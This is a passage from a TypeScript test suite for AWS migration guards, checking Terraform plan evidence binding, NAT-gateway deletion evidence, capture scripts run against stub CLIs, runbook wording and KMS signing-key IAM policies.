    for (const [type, desc] of [["interface", "ECS task"], ["lambda", "AWS Lambda VPC ENI"], ["vpc_endpoint", "VPC Endpoint Interface"], ["transit_gateway", "Network Interface for Transit Gateway Attachment"], ["interface", "RDSNetworkInterface"]]) {
      const e = valid();
      e.networkInterfaces.NetworkInterfaces.push({ NetworkInterfaceId: "eni-other", SubnetId: "subnet-private-b", VpcId: VPC, InterfaceType: type, Description: desc });
      fails(e, /N3 no workload behind the NAT: .*eni-other.*DO NOT DELETE/);
    }
  });
  test("the MAIN route table through the NAT covers every unassociated subnet", () => {
    const e = valid();
    e.routeTables.RouteTables[0].Associations = [{ Main: false, SubnetId: "subnet-public-a" }];
    e.routeTables.RouteTables[1].Associations.push({ Main: true });
    e.networkInterfaces.NetworkInterfaces.push({ NetworkInterfaceId: "eni-other", SubnetId: "subnet-public-b", VpcId: VPC, InterfaceType: "interface", Description: "an instance in an unassociated subnet" });
    fails(e, /eni-other/);
  });
  test("another network attached, traffic, gaps, a short window, a wrong NAT, a missing file", () => {
    const tgw = valid();
    tgw.routeTables.RouteTables[1].Routes.push({ DestinationCidrBlock: "10.1.0.0/16", TransitGatewayId: "tgw-1" });
    fails(tgw, /N4 no other network attached.*tgw-1/);
    const busy = valid();
    busy.bytesOut.Datapoints[7].Sum = 1520;
    fails(busy, /BytesOutToDestination: 1 hour\(s\) not zero/);
    const conn = valid();
    conn.activeConnections.Datapoints[3].Maximum = 1;
    fails(conn, /ActiveConnectionCount: 1 hour/);
    const gap = valid();
    gap.bytesIn.Datapoints.splice(5, 1);
    fails(gap, /a gap proves nothing/);
    const shortWindow = valid();
    shortWindow.capture.metrics_end = "2026-10-06T02:00:00Z";
    shortWindow.capture.captured_at = "2026-10-06T02:01:00Z";
    for (const k of ["activeConnections", "bytesOut", "bytesIn"] as const) shortWindow[k].Datapoints = shortWindow[k].Datapoints.slice(0, 11);
    fails(shortWindow, /the window is 11 h/);
    const early = valid();
    early.capture.metrics_start = "2026-10-05T14:00:00Z";
    fails(early, /N6 the capture is complete/);
    const other = valid();
    other.natGateways.NatGateways[0].NatGatewayId = "nat-0fffffffffffffff0";
    fails(other, /N1 the NAT is identified/);
    const deleted = valid();
    deleted.natGateways.NatGateways[0].State = "deleted";
    fails(deleted, /state deleted/);
    const missing = valid() as Obj;
    delete missing.subnets;
    fails(missing, /missing or unreadable: subnets\.json/);
    const truncated = valid();
    truncated.networkInterfaces.NextToken = "eyJ...";
    fails(truncated, /truncated listing\(s\).*network-interfaces\.json/);
  });
  test("review findings: the hour grid, interfaces in unlisted subnets or none", () => {
    const sameHour = valid();
    for (const k of ["activeConnections", "bytesOut", "bytesIn"] as const) for (const d of sameHour[k].Datapoints) d.Timestamp = "2026-10-05T15:00:00Z";
    fails(sameHour, /1 distinct hourly datapoint/);
    const fiveMin = valid();
    for (const k of ["activeConnections", "bytesOut", "bytesIn"] as const) fiveMin[k].Datapoints.forEach((d: Obj, i: number) => (d.Timestamp = new Date(START + i * 300_000).toISOString()));
    fails(fiveMin, /one per hour on the hour grid/);
    const unlisted = valid();
    unlisted.networkInterfaces.NetworkInterfaces.push({ NetworkInterfaceId: "eni-l", SubnetId: "subnet-unlisted", VpcId: VPC, InterfaceType: "lambda" });
    fails(unlisted, /eni-l/);
    const assoc = valid();
    assoc.routeTables.RouteTables[1].Associations.push({ Main: false, SubnetId: "subnet-unlisted" });
    fails(assoc, /associated subnet\(s\) missing from subnets\.json: subnet-unlisted/);
    const nosub = valid();
    nosub.networkInterfaces.NetworkInterfaces.push({ NetworkInterfaceId: "eni-n", VpcId: VPC, InterfaceType: "interface" });
    fails(nosub, /eni-n/);
  });
});

/* ------------------------------------------------------------------ */

describe("COST-2B: the command and its evidence binding", () => {
  const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), "cost2b-"));
  const sha = (b: Buffer | string) => createHash("sha256").update(b).digest("hex");
  const COMMIT = "7d140b4db777faccf11e220bcf7e3bcbd8fc889a";
  function evidence(gate: GateName, opts: { keep?: boolean; exit?: string; bom?: boolean; stack?: string; provider?: string; tamper?: boolean; extraProvider?: boolean; dirty?: boolean; noCommit?: boolean; plan?: unknown } = {}): string {
    const dir = tmp();
    const planText = `${opts.bom === true ? "﻿" : ""}${JSON.stringify(opts.plan ?? PLANS[gate])}`;
    fs.writeFileSync(path.join(dir, "plan.json"), planText);
    fs.writeFileSync(path.join(dir, "plan-exitcode.txt"), `${opts.exit ?? "2"}\n`);
    fs.writeFileSync(path.join(dir, "version.json"), JSON.stringify({ terraform_version: "1.9.8", provider_selections: { "registry.terraform.io/hashicorp/aws": opts.provider ?? "6.66.0", ...(opts.extraProvider === true ? { "registry.terraform.io/hashicorp/external": "2.3.4" } : {}) } }));
    fs.writeFileSync(path.join(dir, "run.json"), JSON.stringify({ format: "18COSMOS/L6-6-PLAN/v1", run_id: "cost2-test", stack: opts.stack ?? GATES[gate].stack, captured_at: "2026-10-02T20:00:00Z", ...(opts.noCommit === true ? {} : { commit: COMMIT, infra_aws_clean: opts.dirty !== true }), targets: [...(GATE_TARGETS[gate] ?? [])] }));
    if (opts.keep !== false) {
      const binary = Buffer.from(`binary plan for ${gate}`);
      fs.writeFileSync(path.join(dir, SAVED_PLAN), binary);
      fs.writeFileSync(path.join(dir, SAVED_PLAN_SHA), `${sha(binary)}  ${SAVED_PLAN}\n${sha(Buffer.from(planText))}  plan.json\n`);
      if (opts.tamper === true) fs.writeFileSync(path.join(dir, SAVED_PLAN), Buffer.from("another plan"));
    }
    return dir;
  }
  const run = async (argv: string[]) => {
    const lines: string[] = [];
    const code = await migrationGuardCommand(argv, (l) => lines.push(l));
    return { code, text: lines.join("\n") };
  };
  const smokeFile = (lines: string[] = smokeLines()): string => {
    const f = path.join(tmp(), "arm64-live-smoke.txt");
    fs.writeFileSync(f, `${lines.join("\n")}\n`);
    return f;
  };
  const base = (gate: GateName, dir: string) => [
    gate,
    "--plan-evidence",
    dir,
    "--environment",
    "staging",
    "--app-account",
    FIXTURE.appAccountId,
    ...(gate === "edge-cutover" ? ["--origin-domain", FIXTURE.hostOrigin, "--arm64-live-smoke", smokeFile(), "--release-digest", RELEASE, "--instance-id", HOST_ID] : []),
    ...(gate === "host-create" || gate === "host-create-complete" ? ["--region", FIXTURE.region, "--ledger-table-arn", FIXTURE.ledgerTableArn, "--signing-keys", FIXTURE.signingKeyArns.join(",")] : []),
    ...(gate === "host-create-complete" ? ["--commit", COMMIT] : []),
    ...(gate === "app-read-authorize" ? ["--region", FIXTURE.region, "--ledger-table-arn", FIXTURE.ledgerTableArn] : []),
    ...(gate === "ledger-operator-journal" ? ["--ledger-table-arn", FIXTURE.ledgerTableArn] : []),
    ...(gate === "ludum-origins" ? ["--ludum-origins", FIXTURE.ludumOrigin] : []),
  ];

  test("every valid capture PASSES (exit 0), a PowerShell BOM tolerated, and the record is create-once", async () => {
    for (const gate of GATE_NAMES) {
      const dir = evidence(gate, { bom: gate === "compute-none" });
      const record = path.join(dir, "guard.json");
      const r = await run([...base(gate, dir), "--record", record]);
      assert.equal(r.code, 0, r.text);
      assert.match(r.text, new RegExp(`COST-2B MIGRATION GUARD ${gate}: PASS \\(apply ONLY this saved plan`));
      const rec = JSON.parse(fs.readFileSync(record, "utf8"));
      assert.equal(rec.verdict, "PASS");
      assert.equal(rec.saved_plan_sha256, sha(Buffer.from(`binary plan for ${gate}`)));
      const again = await run([...base(gate, dir), "--record", record]);
      assert.equal(again.code, 2);
      assert.match(again.text, /already exists/);
    }
  });
  test("no kept plan, a tampered plan, exit 0 / 1, the wrong stack or provider: FAIL (exit 1)", async () => {
    const cases: Array<[Parameters<typeof evidence>[1], RegExp]> = [
      [{ keep: false }, /capture with plan-evidence --keep-plan/],
      [{ tamper: true }, /does not bind stack\.tfplan and plan\.json/],
      [{ exit: "0" }, /0: the plan has no changes/],
      [{ exit: "1" }, /exit 1/],
      [{ stack: "app" }, /run\.json names app; ledger-host-authorize judges stacks\/ledger/],
      [{ provider: "6.70.0" }, /hashicorp\/aws 6\.70\.0/],
      [{ extraProvider: true }, /other providers selected: registry\.terraform\.io\/hashicorp\/external/],
      [{ dirty: true }, /infra\/aws was not clean/],
      [{ noCommit: true }, /run\.json names no commit/],
    ];
    for (const [opts, why] of cases) {
      const r = await run(base("ledger-host-authorize", evidence("ledger-host-authorize", opts)));
      assert.equal(r.code, 1, r.text);
      assert.match(r.text, why);
      assert.match(r.text, /DO NOT APPLY/);
    }
  });
  test("usage: unknown gate or flag, missing context, cutover without --origin-domain (exit 2)", async () => {
    const dir = evidence("edge-cutover");
    assert.equal((await run(["apply-everything", "--plan-evidence", dir])).code, 2);
    assert.equal((await run(["host-create", "--plan-evidence", dir, "--environment", "staging"])).code, 2);
    assert.equal((await run(["host-create", "--plan-evidence", dir, "--environment", "staging", "--app-account", "1234"])).code, 2);
    assert.equal((await run(["edge-cutover", "--plan-evidence", dir, "--environment", "staging", "--app-account", FIXTURE.appAccountId])).code, 2);
    assert.equal((await run(["host-create", "--plan-evidence", dir, "--bogus", "x"])).code, 2);
    const other = await run([...base("ecr-lifecycle", evidence("ecr-lifecycle")), "--commit", "0".repeat(40)]);
    assert.equal(other.code, 1);
    assert.match(other.text, /not --commit 0000/);
    assert.equal((await run([...base("ecr-lifecycle", evidence("ecr-lifecycle")), "--commit", COMMIT])).code, 0);
    assert.equal((await run([...base("ecr-lifecycle", evidence("ecr-lifecycle")), "--commit", "abc"])).code, 2);
    const noFacts = await run(["host-create", "--plan-evidence", dir, "--environment", "staging", "--app-account", FIXTURE.appAccountId]);
    assert.equal(noFacts.code, 2);
    assert.match(noFacts.text, /host-create needs --region .*--ledger-table-arn .*--signing-keys/);
    assert.equal((await run(["compute-none", "--plan-evidence", dir, "--environment", "staging", "--app-account", FIXTURE.appAccountId, "--retired-pools", "p1"])).code, 2);
  });
  test("OWNER-GATE FIX 1: the edge cutover REQUIRES the live ARM64 smoke -- missing flags refused, FAIL / NOT EVALUATED block, rollback exempt", async () => {
    const cut = (smoke: string | null, digest: string | null = RELEASE, extra: string[] = [], instance: string | null = HOST_ID) => [
      "edge-cutover", "--plan-evidence", evidence("edge-cutover"), "--environment", "staging", "--app-account", FIXTURE.appAccountId, "--origin-domain", FIXTURE.hostOrigin,
      ...(smoke === null ? [] : ["--arm64-live-smoke", smoke]), ...(digest === null ? [] : ["--release-digest", digest]), ...(instance === null ? [] : ["--instance-id", instance]), ...extra,
    ];
    /* no smoke / no digest / no instance / a malformed digest or instance / a bad direction / a cutover with a rollback's
       record: usage (exit 2) -- the cutover cannot even be judged */
    for (const argv of [cut(null), cut(smokeFile(), null), cut(smokeFile(), RELEASE, [], null), cut(smokeFile(), "sha256:xyz"), cut(smokeFile(), RELEASE, [], "i-xyz"), cut(smokeFile(), RELEASE, ["--direction", "sideways"]), cut(smokeFile(), RELEASE, ["--cutover-record", "x.json"])]) {
      const r = await run(argv);
      assert.equal(r.code, 2, r.text);
    }
    assert.match((await run(cut(null))).text, /EXECUTED on the real Graviton host first/);
    /* a PASSing capture: PASS, and the record carries the smoke's verdict and file hash */
    const record = path.join(tmp(), "14.json");
    const ok = await run([...cut(smokeFile()), "--record", record]);
    assert.equal(ok.code, 0, ok.text);
    const rec = JSON.parse(fs.readFileSync(record, "utf8"));
    assert.equal(rec.direction, "cutover");
    assert.equal(rec.arm64_live_smoke.verdict, "PASS");
    assert.match(rec.arm64_live_smoke.sha256, /^[0-9a-f]{64}$/);
    assert.equal(rec.arm64_live_smoke.instance_type, "t4g.small");
    /* FAIL and NOT EVALUATED captures, and a missing file: the guard FAILS (exit 1, DO NOT APPLY) */
    for (const [smoke, why] of [
      [smokeFile(swap(/^host_arch=/, "host_arch=x86_64")), /not a Graviton host/],
      [smokeFile(smokeLines().slice(0, -1)), /NOT EVALUATED.*no END/],
      [smokeFile(smokeLines()), /not the release/],
      [path.join(tmp(), "never-captured.txt"), /run gs-host arm64-smoke \(step 12b\)/],
    ] as Array<[string, RegExp]>) {
      const r = await run(cut(smoke, why.source.includes("not the release") ? `sha256:${"e".repeat(64)}` : RELEASE));
      assert.equal(r.code, 1, r.text);
      assert.match(r.text, why);
      assert.match(r.text, /COST-2B MIGRATION GUARD edge-cutover: FAIL -- DO NOT APPLY/);
    }
    /* a Windows PowerShell 5.1 Tee-Object capture (UTF-16LE + BOM) is decoded and PASSES; another host's capture FAILS */
    const utf16 = path.join(tmp(), "tee.txt");
    fs.writeFileSync(utf16, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`${smokeLines().join("\r\n")}\r\n`, "utf16le")]));
    assert.equal((await run(cut(utf16))).code, 0);
    const other = await run(cut(smokeFile(), RELEASE, [], "i-0fedcba9876543210"));
    assert.equal(other.code, 1);
    assert.match(other.text, /not the single host i-0fedcba9876543210/);
    /* the smoke flags belong to edge-cutover only */
    assert.equal((await run([...base("ecr-lifecycle", evidence("ecr-lifecycle")), "--arm64-live-smoke", smokeFile()])).code, 2);
  });
  test("OWNER-GATE FIX 1: a rollback is PROVEN, never labelled -- the forward PASS record and the plan's exact reverse; a forward plan called a rollback FAILS", async () => {
    /* the forward step's PASS record (as step 14 writes it) */
    const forwardRecord = path.join(tmp(), "14.json");
    assert.equal((await run([...base("edge-cutover", evidence("edge-cutover")), "--record", forwardRecord])).code, 0);
    const fwd = JSON.parse(fs.readFileSync(forwardRecord, "utf8"));
    const alb = fwd.from_domain as string;
    assert.ok(typeof alb === "string" && alb !== FIXTURE.hostOrigin, "the record keeps the ALB origin it moved away from");
    assert.equal(fwd.to_domain, FIXTURE.hostOrigin);
    /* the true rollback plan: the same distribution update, reversed (host -> ALB) */
    const reverse = clone(PLANS["edge-cutover"]) as Obj;
    const d = (reverse.resource_changes as Obj[]).find((r) => r.type === "aws_cloudfront_distribution");
    assert.ok(d);
    for (const o of d!.change.before.origin as Obj[]) if (o.origin_id === "gs-alb") o.domain_name = FIXTURE.hostOrigin;
    for (const o of d!.change.after.origin as Obj[]) if (o.origin_id === "gs-alb") o.domain_name = alb;
    const back = (plan: unknown, record: string | null, origin = alb) => [
      "edge-cutover", "--plan-evidence", evidence("edge-cutover", plan === null ? {} : { plan }), "--environment", "staging", "--app-account", FIXTURE.appAccountId,
      "--origin-domain", origin, "--direction", "rollback", ...(record === null ? [] : ["--cutover-record", record]),
    ];
    /* a rollback without the forward record: usage */
    assert.equal((await run(back(reverse, null))).code, 2);
    /* the true rollback: PASS without any smoke */
    const ok = await run(back(reverse, forwardRecord));
    assert.equal(ok.code, 0, ok.text);
    assert.match(ok.text, /PASS  rollback: the plan reverses the cutover/);
    /* THE BYPASS (review finding): the FORWARD plan judged as a "rollback" toward the host -- FAILS */
    const bypass = await run(back(null, forwardRecord, FIXTURE.hostOrigin));
    assert.equal(bypass.code, 1, bypass.text);
    assert.match(bypass.text, /--origin-domain gs-origin-host\.example\.org is not the ALB origin/);
    assert.match(bypass.text, /a forward plan is never a rollback/);
    assert.match(bypass.text, /DO NOT APPLY/);
    /* a record that is not a PASSING forward cutover with a PASSING smoke: FAIL; an unreadable record: FAIL (not evaluated) */
    const failedRecord = path.join(tmp(), "14-failed.json");
    fs.writeFileSync(failedRecord, JSON.stringify({ ...fwd, verdict: "FAIL" }));
    assert.equal((await run(back(reverse, failedRecord))).code, 1);
    const noSmoke = path.join(tmp(), "14-nosmoke.json");
    fs.writeFileSync(noSmoke, JSON.stringify({ ...fwd, arm64_live_smoke: { verdict: "NOT EVALUATED" } }));
    assert.equal((await run(back(reverse, noSmoke))).code, 1);
    assert.equal((await run(back(reverse, path.join(tmp(), "absent.json")))).code, 1);
  });
  test("nat: PASS and FAIL through the command", async () => {
    const dir = tmp();
    const NAT = "nat-0123456789abcdef0";
    const VPC = "vpc-0123456789abcdef0";
    const pts = (stat: string) => Array.from({ length: 24 }, (_, i) => ({ Timestamp: new Date(Date.parse("2026-10-05T15:00:00Z") + i * 3600_000).toISOString(), [stat]: 0 }));
    const files: Record<string, unknown> = {
      [NAT_FILES.capture]: { format: NAT_EVIDENCE_FORMAT, nat_gateway_id: NAT, vpc_id: VPC, teardown_applied_at: "2026-10-05T14:00:00Z", metrics_start: "2026-10-05T15:00:00Z", metrics_end: "2026-10-06T15:00:00Z", captured_at: "2026-10-06T15:01:00Z" },
      [NAT_FILES.natGateways]: { NatGateways: [{ NatGatewayId: NAT, VpcId: VPC, State: "available", NatGatewayAddresses: [{ NetworkInterfaceId: "eni-nat" }] }] },
      [NAT_FILES.routeTables]: { RouteTables: [{ RouteTableId: "rtb-1", VpcId: VPC, Associations: [{ SubnetId: "subnet-a" }], Routes: [{ NatGatewayId: NAT }] }] },
      [NAT_FILES.subnets]: { Subnets: [{ SubnetId: "subnet-a", VpcId: VPC }] },
      [NAT_FILES.networkInterfaces]: { NetworkInterfaces: [] },
      [NAT_FILES.activeConnections]: { Label: "ActiveConnectionCount", Datapoints: pts("Maximum") },
      [NAT_FILES.bytesOut]: { Label: "BytesOutToDestination", Datapoints: pts("Sum") },
      [NAT_FILES.bytesIn]: { Label: "BytesInFromSource", Datapoints: pts("Sum") },
    };
    for (const [name, value] of Object.entries(files)) fs.writeFileSync(path.join(dir, name), JSON.stringify(value));
    const ok = await run(["nat", "--evidence", dir]);
    assert.equal(ok.code, 0, ok.text);
    assert.match(ok.text, /COST-2B NAT DELETION EVIDENCE: PASS \(evidence for the owner's decision; nothing was deleted\)/);
    fs.writeFileSync(path.join(dir, NAT_FILES.networkInterfaces), JSON.stringify({ NetworkInterfaces: [{ NetworkInterfaceId: "eni-x", SubnetId: "subnet-a", VpcId: VPC, InterfaceType: "lambda" }] }));
    const bad = await run(["nat", "--evidence", dir]);
    assert.equal(bad.code, 1);
    assert.match(bad.text, /DO NOT DELETE THE NAT GATEWAY/);
    assert.equal((await run(["nat", "--evidence", dir, "--min-quiet-hours", "2"])).code, 2);
  });
});

/* ------------------------------------------------------------------ */

/* POSIX only, as every other bash-script suite here (LIVE-6 / COST-2A precedent): on Windows `bash` is Git Bash or the WSL
   launcher, and a core.autocrlf=true checkout hands it CRLF scripts -- the .ps1 twins are Windows' scripts. */
const hasBash = process.platform !== "win32" && spawnSync("bash", ["-c", "true"]).status === 0 && spawnSync("bash", ["-c", "command -v sha256sum || command -v shasum"]).status === 0;

describe("COST-2B: the capture scripts against a stub CLI", { skip: hasBash ? false : "POSIX bash / sha256sum not available (Windows: the .ps1 twins)" }, () => {
  test("plan-evidence: single-host accepted, --keep-plan binds the binary plan and plan.json, a stale plan never survives", () => {
    const bin = fs.mkdtempSync(path.join(os.tmpdir(), "cost2b-bin-"));
    fs.writeFileSync(
      path.join(bin, "terraform"),
      `#!/usr/bin/env bash
for a in "$@"; do case "$a" in -out=*) printf 'BINARY-PLAN' > "\${a#-out=}";; esac; done
case " $* " in *" version "*) echo '{"terraform_version":"1.9.8","provider_selections":{"registry.terraform.io/hashicorp/aws":"6.66.0"}}';; *" plan "*) exit 2;; *" show "*) echo '{"format_version":"1.2"}';; esac
`,
      { mode: 0o755 },
    );
    const out = fs.mkdtempSync(path.join(os.tmpdir(), "cost2b-ev-"));
    const script = path.join(REPO, "infra/aws/scripts/plan-evidence.sh");
    const env = { ...process.env, PATH: `${bin}:${process.env.PATH ?? ""}` };
    execFileSync("bash", [script, "single-host", out, "cost2-test1", "--keep-plan", "-var-file=x.tfvars"], { env, stdio: "pipe" });
    /* RECON-1A: the -target options are recorded (both spellings; JSON-escaped), [] when untargeted */
    assert.deepEqual(JSON.parse(fs.readFileSync(path.join(out, "terraform", "single-host", "run.json"), "utf8")).targets, []);
    const tOut = fs.mkdtempSync(path.join(os.tmpdir(), "cost2b-ev-"));
    execFileSync("bash", [script, "app", tOut, "recon1-7a-test", "--keep-plan", "-var-file=x.tfvars", "-target=module.app.aws_iam_role_policy.bootstrap", "-target", "module.app.aws_iam_role_policy.operator[0]", '-target=module.app.aws_ssm_parameter.runtime["p1"]'], { env, stdio: "pipe" });
    assert.deepEqual(JSON.parse(fs.readFileSync(path.join(tOut, "terraform", "app", "run.json"), "utf8")).targets, ["module.app.aws_iam_role_policy.bootstrap", "module.app.aws_iam_role_policy.operator[0]", 'module.app.aws_ssm_parameter.runtime["p1"]']);
    const dir = path.join(out, "terraform", "single-host");
    assert.equal(fs.readFileSync(path.join(dir, "stack.tfplan"), "utf8"), "BINARY-PLAN");
    const shaText = fs.readFileSync(path.join(dir, "stack.tfplan.sha256"), "utf8");
    assert.match(shaText, new RegExp(`${createHash("sha256").update("BINARY-PLAN").digest("hex")}\\s+\\*?stack\\.tfplan`));
    assert.match(shaText, new RegExp(`${createHash("sha256").update(fs.readFileSync(path.join(dir, "plan.json"))).digest("hex")}\\s+\\*?plan\\.json`));
    const runJson = JSON.parse(fs.readFileSync(path.join(dir, "run.json"), "utf8"));
    assert.equal(runJson.stack, "single-host");
    assert.match(runJson.commit, /^[0-9a-f]{40}$/);
    assert.equal(typeof runJson.infra_aws_clean, "boolean");
    /* a later capture without --keep-plan removes the earlier binary plan */
    execFileSync("bash", [script, "single-host", out, "cost2-test2"], { env, stdio: "pipe" });
    assert.equal(fs.existsSync(path.join(dir, "stack.tfplan")), false);
    assert.equal(fs.existsSync(path.join(dir, "stack.tfplan.sha256")), false);
    for (const refused of [["app", out, "cost2-test3", "-destroy"], ["app", out, "cost2-test3", "-var-file=x", "--keep-plan"], ["host", out, "cost2-test3"]]) {
      assert.equal(spawnSync("bash", [script, ...refused], { env }).status, 2, refused.join(" "));
    }
  });
  test("capture-nat-evidence: read-only describes, whole-hour window, a capture the judge reads", () => {
    const bin = fs.mkdtempSync(path.join(os.tmpdir(), "cost2b-aws-"));
    const log = path.join(bin, "calls.log");
    fs.writeFileSync(path.join(bin, "aws"), `#!/usr/bin/env bash\necho "$*" >> "${log}"\necho '{}'\n`, { mode: 0o755 });
    const out = fs.mkdtempSync(path.join(os.tmpdir(), "cost2b-nat-"));
    const env = { ...process.env, PATH: `${bin}:${process.env.PATH ?? ""}` };
    execFileSync("bash", [path.join(REPO, "infra/aws/scripts/capture-nat-evidence.sh"), "staging", "us-east-1", "nat-0123456789abcdef0", "vpc-0123456789abcdef0", "2026-10-05T14:21:07Z", out], { env, stdio: "pipe" });
    const calls = fs.readFileSync(log, "utf8").trim().split("\n");
    assert.equal(calls.length, 7);
    for (const c of calls) assert.match(c, /^(ec2 describe-|cloudwatch get-metric-statistics )/, `read-only: ${c}`);
    assert.ok(calls.filter((c) => c.startsWith("cloudwatch")).every((c) => c.includes("--start-time 2026-10-05T15:00:00Z") && c.includes("--period 3600")));
    const cap = JSON.parse(fs.readFileSync(path.join(out, "capture.json"), "utf8"));
    assert.equal(cap.format, NAT_EVIDENCE_FORMAT);
    assert.equal(cap.metrics_start, "2026-10-05T15:00:00Z");
    assert.match(cap.metrics_end, /T\d\d:00:00Z$/);
    assert.equal(spawnSync("bash", [path.join(REPO, "infra/aws/scripts/capture-nat-evidence.sh"), "staging", "us-east-1", "nat-x", "vpc-0123456789abcdef0", "2026-10-05T14:21:07Z", out], { env }).status, 2);
  });
});

/* ------------------------------------------------------------------ */

/** Every `resource "<type>" "<name>"` of a module, with its first lines (its count / for_each). */
function moduleResources(dir: string): Array<{ type: string; name: string; head: string }> {
  const out: Array<{ type: string; name: string; head: string }> = [];
  for (const f of fs.readdirSync(path.join(REPO, dir)).filter((n) => n.endsWith(".tf"))) {
    const text = read(`${dir}/${f}`);
    for (const m of text.matchAll(/^resource\s+"([a-z0-9_]+)"\s+"([a-z0-9_]+)"\s*\{([\s\S]*?)\n\}/gm)) out.push({ type: m[1], name: m[2], head: m[3].split("\n").slice(0, 4).join("\n") });
  }
  return out;
}

describe("COST-2B: the guards' resource lists are the modules'", () => {
  test("TEARDOWN_CLASSES == every modules/app resource gated on the ECS compute (local.ecs / ecs_one / ecs_pools / alarm_keys)", () => {
    const gated = moduleResources("infra/aws/modules/app")
      .filter((r) => /^\s*(count|for_each)\s*=.*\blocal\.(ecs|ecs_one|ecs_pools|alarm_keys)\b/m.test(r.head))
      .map((r) => `${r.type}.${r.name}`)
      .sort();
    const classes = TEARDOWN_CLASSES.flatMap((k) => k.resources.map(([t, n]) => `${t}.${n}`)).sort();
    assert.deepEqual(classes, gated, "a new ECS-era resource must join a teardown class (and a removed one leave it)");
  });
  test("the host-create surface == modules/single-host's resources (the ECR lifecycle waits for step 22b)", () => {
    const declared = moduleResources("infra/aws/modules/single-host")
      .map((r) => `${r.type}.${r.name}`)
      .filter((a) => a !== "aws_ecr_lifecycle_policy.server")
      .sort();
    const surface = [...HOST_SINGLETONS.map((a) => a.replace(/\[0\]$/, "")), ...HOST_MULTI.map(([t, n]) => `${t}.${n}`)].sort();
    assert.deepEqual(surface, declared);
  });
});

describe("COST-2B: the reconciled runbook", () => {
  const RUNBOOK = read("infra/aws/SINGLE_HOST_MIGRATION.md");
  test("it starts from the accepted post-abandonment state", () => {
    for (const fact of [/APPGEN\s*(=|is)\s*1/, /no generation-2 history/i, /g1.*authoritative/i, /g2.*(unadopted|UNADOPTED)/, /0\/0\/0/, /break-glass.*OFF/i, /recovery role.*removed|removed.*recovery role/i, /0 money games|no (open )?money game/i, /RELAYQ.*empty/i, /frozen/i]) {
      assert.match(RUNBOOK, fact);
    }
  });
  test("it never repeats the completed recovery-access unwind, nor implies GO-C happened", () => {
    assert.doesNotMatch(RUNBOOK, /apply the \*\*unchanged generation-1\*\* configuration/);
    assert.doesNotMatch(RUNBOOK, /`terraform apply` the/);
    assert.doesNotMatch(RUNBOOK, /return staging to a safe known state/i);
    for (const line of RUNBOOK.split("\n").filter((l) => /GO-C|appgen-adopt/.test(l))) assert.match(line, /\b(never|not|no|NOT|NEVER|without)\b/, `a GO-C line must be a negation: ${line}`);
  });
  test("every Terraform step names its guard; the cutover is targeted; the NAT has its evidence gate", () => {
    for (const gate of GATE_NAMES) assert.match(RUNBOOK, new RegExp(`migration-guard ${gate}\\b`), gate);
    assert.match(RUNBOOK, /migration-guard nat\b/);
    assert.match(RUNBOOK, /-target=module\.app\.aws_cloudfront_distribution\.site\[0\]/);
    assert.match(RUNBOOK, /--keep-plan|-KeepPlan/);
    assert.match(RUNBOOK, /capture-nat-evidence/);
    assert.match(RUNBOOK, /desired.count drift/i);
  });
});

/* ------------------------------------------------------------------ */
/* PHASE 3 ESCROW 2.1: the DEDICATED REMEDY key on the host role         */
/* ------------------------------------------------------------------ */

describe("Phase 3 escrow 2.1: host-create judges the dedicated REMEDY key as an operator fact", () => {
  const REMEDY = "arn:aws:kms:us-east-1:222222222222:key/77777777-7777-4777-8777-777777777777";
  /** The host-create plan as modules/single-host renders it WITH `remedy_signing_key = REMEDY`: the variable, and the two
   *  RemedyKey statements right after the three-key statements (iam.tf's order). */
  const withRemedy = (statements: (remedy: string) => Array<Record<string, unknown>> = (remedy) => [
    { Action: ["kms:GetPublicKey"], Effect: "Allow", Resource: [remedy], Sid: "RemedyKeyPublicKey" },
    { Action: ["kms:Sign"], Condition: { StringEquals: { "kms:MessageType": "DIGEST", "kms:SigningAlgorithm": "ECDSA_SHA_256" } }, Effect: "Allow", Resource: [remedy], Sid: "RemedyKeySignDigestOnly" },
  ]): Obj => {
    const p = plan("host-create");
    (p.variables as Obj).remedy_signing_key = { value: REMEDY };
    const r = rc(p, `${H}.aws_iam_role_policy.host`);
    const after = (r.change as Obj).after as Obj;
    const doc = JSON.parse(String(after.policy)) as { Statement: Array<Record<string, unknown>> };
    const i = doc.Statement.findIndex((s) => s.Sid === "SigningKeysSignDigestOnly");
    doc.Statement.splice(i + 1, 0, ...statements(REMEDY));
    after.policy = JSON.stringify(doc);
    return p;
  };

  test("a plan naming exactly the operator's remedy key, in its own two statements, passes", () => {
    assert.equal(judgeOf("host-create", withRemedy(), { ...CTX, remedyKeyArn: REMEDY }).verdict, "PASS");
    /* Without one on either side: unchanged (the committed fixture, no operator remedy key). */
    assert.equal(judgeOf("host-create", plan("host-create"), CTX).verdict, "PASS");
  });

  test("the remedy key is the OPERATOR's fact: a plan cannot add, swap or drop it on its own", () => {
    rejects("host-create", withRemedy(), /the host policy's inputs do not match/, CTX);
    rejects("host-create", plan("host-create"), /the host policy's inputs do not match/, { ...CTX, remedyKeyArn: REMEDY });
    rejects("host-create", withRemedy(), /the host policy's inputs do not match/, { ...CTX, remedyKeyArn: REMEDY.replace("77777777-7777-4777-8777-777777777777", "88888888-8888-4888-8888-888888888888") });
  });

  test("the remedy key never widens the three-key statements, and never signs without the digest conditions", () => {
    const widened = withRemedy();
    const r = rc(widened, `${H}.aws_iam_role_policy.host`);
    const after = (r.change as Obj).after as Obj;
    const doc = JSON.parse(String(after.policy)) as { Statement: Array<Record<string, unknown>> };
    for (const s of doc.Statement) if (s.Sid === "SigningKeysSignDigestOnly") s.Resource = [...(s.Resource as string[]), REMEDY];
    after.policy = JSON.stringify(doc);
    rejects("host-create", widened, /SigningKeysSignDigestOnly/, { ...CTX, remedyKeyArn: REMEDY });
    rejects("host-create", withRemedy((remedy) => [
      { Action: ["kms:GetPublicKey"], Effect: "Allow", Resource: [remedy], Sid: "RemedyKeyPublicKey" },
      { Action: ["kms:Sign"], Effect: "Allow", Resource: [remedy], Sid: "RemedyKeySignDigestOnly" },
    ]), /RemedyKeySignDigestOnly/, { ...CTX, remedyKeyArn: REMEDY });
    rejects("host-create", withRemedy((remedy) => [
      { Action: ["kms:GetPublicKey"], Effect: "Allow", Resource: [remedy], Sid: "RemedyKeyPublicKey" },
      { Action: ["kms:Sign"], Condition: { StringEquals: { "kms:MessageType": "DIGEST", "kms:SigningAlgorithm": "ECDSA_SHA_256" } }, Effect: "Allow", Resource: ["*"], Sid: "RemedyKeySignDigestOnly" },
